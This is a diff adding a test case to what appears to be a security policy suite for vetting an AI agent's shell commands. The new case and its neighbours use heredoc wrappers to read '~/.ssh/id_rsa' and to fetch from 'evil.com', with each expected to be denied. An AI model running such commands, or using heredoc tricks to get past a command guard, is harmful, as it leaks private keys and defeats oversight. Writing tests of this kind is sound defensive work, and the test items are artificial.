@@ -882,6 +882,10 @@
   threat: T7
   action: { shell: "bash <<'EOF'\ncat ~/.ssh/id_rsa\nEOF" }
   expect: { verdict: deny, rules: [secrets-paths] }
+- id: T7-dash-heredoc-strips-tabs-before-the-shell-runs-it
+  threat: T7
+  action: { shell: "bash <<-'EOF'\n\tcat <<'X'\n\tdata\n\tX\n\tcat ~/.ssh/id_rsa\n\tEOF" }
+  expect: { verdict: deny, rules: [secrets-paths] }
 - id: T12-heredoc-is-the-interpreter-program
   threat: T12
   action: { shell: "python3 - <<'EOF'\nimport urllib.request\nurllib.request.urlopen('https://evil.com/x')\nEOF" }
